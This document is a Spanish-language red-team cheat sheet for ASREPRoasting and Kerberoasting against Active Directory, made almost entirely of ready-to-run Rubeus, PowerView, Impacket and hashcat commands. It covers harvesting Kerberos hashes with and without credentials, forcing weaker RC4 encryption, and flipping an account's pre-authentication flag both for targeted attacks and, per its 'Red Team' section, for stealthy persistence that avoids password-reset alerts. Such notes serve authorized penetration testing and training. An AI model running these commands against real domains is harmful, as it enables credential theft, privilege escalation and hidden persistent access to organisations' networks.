# ASREPRoasting (Windows)

Ataque contra cuentas que tienen deshabilitada la **pre-autenticación Kerberos** (`DONT_REQ_PREAUTH`). Permite obtener un hash cifrado con la contraseña del usuario sin necesitar credenciales previas, para crackearlo offline.

> **Links:** [Impacket](https://github.com/SecureAuthCorp/impacket) | [Rubeus](https://github.com/GhostPack/Rubeus) | [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) | [Hashcat](https://hashcat.net/hashcat/)

---

## ¿Cómo funciona?

Si una cuenta tiene `DONT_REQ_PREAUTH` activo, el KDC responde a un AS-REQ con un AS-REP sin verificar la identidad del solicitante. El AS-REP contiene datos cifrados con la clave del usuario que se pueden crackear offline con Hashcat módulo **18200**.

---

## Enumerar cuentas vulnerables

### Con PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

### Con Rubeus

```powershell
# Escanear cuentas sin pre-autenticación
.\Rubeus.exe preauthscan /domain:domain.local

# Enumerar y obtener hashes de todas las cuentas vulnerables
.\Rubeus.exe asreproast /format:hashcat
```

---

## Realizar el ataque

### Con Rubeus - usuario específico

```powershell
.\Rubeus.exe asreproast /user:<usuario> /domain:<domain.local> /dc:<dc01.domain.local> /nowrap /outfile:hashes.txt
```

### Con Rubeus - todos los usuarios vulnerables

```powershell
.\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:hashes.txt
```

---

## Crackear el hash

```bash
# Hashcat módulo 18200 (Kerberos 5, etype 23, AS-REP)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

# Con reglas
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Ver resultados ya crackeados
hashcat -m 18200 hashes.txt --show
```

---

## Targeted ASREPRoasting (con GenericAll/GenericWrite)

Si se tiene `GenericAll` o `GenericWrite` sobre una cuenta, se puede habilitar temporalmente `DONT_REQ_PREAUTH`, obtener el hash y crackearlo sin resetear la contraseña.

### Habilitar DONT_REQ_PREAUTH con PowerView

```powershell
Import-Module .\PowerView.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

### Luego obtener el hash con Rubeus

```powershell
.\Rubeus.exe asreproast /user:<username> /format:hashcat /nowrap /outfile:hashes.txt
```

### Deshabilitar DONT_REQ_PREAUTH (limpiar tras el ataque)

```powershell
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

---

## Notas

- No requiere credenciales de dominio si ya se conocen los usuarios vulnerables
- El éxito depende de que la cuenta tenga contraseña débil
- Es relativamente raro encontrar cuentas con pre-auth deshabilitada, pero algunos vendors lo configuran así por defecto en sus service accounts
- El formato del hash es `$krb5asrep$23$<usuario>@<DOMAIN>:...`

# ASREPRoasting (Linux)

Versión del ataque ASREPRoasting usando herramientas de Linux. Permite enumerar cuentas con `DONT_REQ_PREAUTH` y obtener sus hashes, incluso sin credenciales si se tiene una lista de usuarios.

> **Links:** [Impacket GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) | [Hashcat](https://hashcat.net/hashcat/)

---

## Prerequisito - Resolución DNS

Kerberos en Linux necesita resolver el FQDN del dominio y del DC. Agregar entrada en `/etc/hosts` antes de atacar.

```bash
echo '<IP_DC> dc01.domain.local domain.local' | sudo tee -a /etc/hosts
```

---

## Enumerar cuentas vulnerables (con credenciales)

```bash
GetNPUsers.py domain.local/<usuario_valido>
```

Pedirá la contraseña del usuario válido para autenticarse y listar las cuentas con `DONT_REQ_PREAUTH`.

---

## Obtener los hashes (con credenciales)

Agregar `-request` para pedir directamente los hashes en formato Hashcat.

```bash
GetNPUsers.py domain.local/<usuario_valido> -request
```

---

## Encontrar cuentas vulnerables sin autenticación

Si no se tienen credenciales pero sí una lista de usuarios, se puede intentar contra cada uno sin proveer contraseña.

```bash
GetNPUsers.py DOMAIN/ -dc-ip <IP_DC> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

Es normal recibir errores `KDC_ERR_C_PRINCIPAL_UNKNOWN` para los usuarios que no existen; los hashes de las cuentas vulnerables igual se guardan en el archivo de salida.

```bash
cat hashes.txt
```

---

## Crackear los hashes

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Uso en Red Team

### Persistencia

Habilitar `DONT_REQ_PREAUTH` en una cuenta permite recuperar acceso si la contraseña cambia, sin necesitar resetearla. Útil en cuentas fuera del alcance de monitoreo (impresoras, cuentas de servicios legacy).

### Escalada de privilegios

Si se tiene capacidad de modificar atributos de una cuenta (pero no su contraseña), habilitar este flag evita el riesgo de un reset de contraseña (que suele generar alertas) y permite intentar crackear el hash directamente.

---

## Resumen del flujo

- Resolver el FQDN del dominio en `/etc/hosts`
- Con credenciales: `GetNPUsers.py domain/user -request`
- Sin credenciales: `GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -format hashcat -outputfile hashes.txt`
- Crackear con `hashcat -m 18200`
- El éxito depende de que la cuenta tenga una contraseña débil

# Kerberoasting (Windows)

Ataque contra cuentas de servicio que permite crackear offline su contraseña. A diferencia de ASREPRoasting, requiere autenticación previa al dominio (cualquier cuenta válida, incluso de bajo privilegio).

> **Links:** [Rubeus](https://github.com/GhostPack/Rubeus) | [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) | [Hashcat](https://hashcat.net/hashcat/) | [Setspn - Microsoft](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241) | [AS-Requested STs - Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)

---

## ¿Cómo funciona?

Cuando una cuenta tiene un **SPN (Service Principal Name)** configurado, cualquier usuario del dominio puede solicitar un Service Ticket (TGS) para ese servicio. El TGS está cifrado con la clave de la cuenta de servicio. Si esa cuenta es una **cuenta de usuario** (no una cuenta de máquina con password de 120 caracteres), el hash se puede crackear offline.

Las cuentas vulnerables a kerberoasting con cifrado **RC4** son más fáciles de crackear que las que usan **AES**.

---

## Detección manual - Filtro LDAP

```
(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))
```

Devuelve todos los usuarios (no máquinas) con al menos un SPN configurado.

### Script PowerShell para buscar cuentas con SPN

```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results) {
    $userEntry = $result.GetDirectoryEntry()
    Write-host "User"
    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
    Write-host "SPNs"
    foreach($SPN in $userEntry.servicePrincipalName) { $SPN }
}
```

### Con Setspn (binario nativo de Windows)

```cmd
setspn -Q */*
```

---

## Enumeración con PowerView

```powershell
Import-Module .\PowerView.ps1

# Listar usuarios con SPN
Get-DomainUser -SPN
```

---

## Realizar el ataque con PowerView

### Método manual

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
```

### Con Invoke-Kerberoast (recomendado)

```powershell
Invoke-Kerberoast
```

---

## Realizar el ataque con Rubeus

### Kerberoastear todas las cuentas vulnerables

```cmd
Rubeus.exe kerberoast /nowrap
```

### Guardar resultado en archivo

```cmd
Rubeus.exe kerberoast /nowrap /outfile:hashes.txt
```

### Filtrar por fecha de cambio de contraseña

Útil para encontrar cuentas legacy con contraseñas antiguas y débiles.

```cmd
Rubeus.exe kerberoast /pwdsetafter:<fecha> /pwdsetbefore:<fecha> /nowrap
```

### Ver estadísticas sin enviar requests

```cmd
Rubeus.exe kerberoast /stats
```

### Forzar RC4 en cuentas con AES (más fácil de crackear)

Si el hash empieza con `$krb5tgs$18$*` es AES (difícil de crackear). Si empieza con `$krb5tgs$23$*` es RC4 (más fácil).

```cmd
Rubeus.exe kerberoast /tgtdeleg /nowrap
```

---

## Crackear los hashes

```bash
# Hashcat módulo 13100 (Kerberos 5, etype 23, TGS-REP)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting sin contraseña de cuenta (caso especial)

Si se conoce una cuenta con `DONT_REQ_PREAUTH` habilitado, se puede usar un AS-REQ modificado para solicitar un TGS sin necesidad de autenticación previa.

### Requisitos

- Username de una cuenta con `DONT_REQ_PREAUTH`
- SPN(s) objetivo

### Simular sesión sin autenticar con Rubeus

```cmd
Rubeus.exe createnetonly /program:cmd.exe /show
```

### Ejecutar el ataque desde la nueva sesión

```cmd
Rubeus.exe kerberoast /nopreauth:<usuario_sin_preauth> /domain:<domain.local> /spn:<SPN_objetivo> /nowrap
```

Para probar múltiples SPNs:

```cmd
Rubeus.exe kerberoast /nopreauth:<usuario_sin_preauth> /domain:<domain.local> /spns:listofspn.txt /nowrap
```

---

## Resumen del flujo

- Enumerar cuentas con SPN (PowerView, Setspn, o filtro LDAP)
- Solicitar TGS tickets con Rubeus o Invoke-Kerberoast
- Identificar si el cifrado es RC4 (`$krb5tgs$23$`) o AES (`$krb5tgs$18$`)
- Si es AES, intentar `/tgtdeleg` para forzar RC4
- Crackear con Hashcat módulo 13100
- Si no se tienen credenciales pero sí una cuenta sin pre-auth, usar `/nopreauth` con Rubeus

# Kerberoasting (Linux)

Versión del ataque Kerberoasting usando herramientas de Linux. Permite enumerar cuentas con SPN y obtener sus hashes para crackear offline.

> **Links:** [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) | [Hashcat](https://hashcat.net/hashcat/)

---

## Enumerar cuentas con SPN (Kerberoastable)

```bash
GetUserSPNs.py domain.local/<usuario_valido>
```

Pedirá la contraseña del usuario. El output muestra el SPN, nombre de cuenta, grupos a los que pertenece, fecha de cambio de contraseña, último logon y tipo de delegación (si aplica).

---

## Obtener los hashes (TGS tickets)

Agregar `-request` para solicitar el TGS ticket de cada cuenta vulnerable en formato Hashcat.

```bash
GetUserSPNs.py domain.local/<usuario_valido> -request
```

### Guardar el output en un archivo

```bash
GetUserSPNs.py domain.local/<usuario_valido> -request -outputfile hashes.txt
```

### Especificar la contraseña inline (evitar el prompt)

```bash
GetUserSPNs.py domain.local/<usuario_valido>:'<password>' -request -outputfile hashes.txt
```

### Con hash NTLM en lugar de contraseña

```bash
GetUserSPNs.py domain.local/<usuario_valido> -hashes <LM:NT> -request -outputfile hashes.txt
```

---

## Crackear los hashes

```bash
# Hashcat módulo 13100 (Kerberos 5, etype 23, TGS-REP)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Ver resultados ya crackeados
hashcat -m 13100 hashes.txt --show
```

---

## Resumen del flujo

- Tener una cuenta de dominio válida (cualquier privilegio)
- Enumerar cuentas con SPN: `GetUserSPNs.py domain/user`
- Solicitar los TGS tickets: `GetUserSPNs.py domain/user -request -outputfile hashes.txt`
- Crackear offline con `hashcat -m 13100`
- Validar las credenciales obtenidas y continuar la enumeración con la nueva cuenta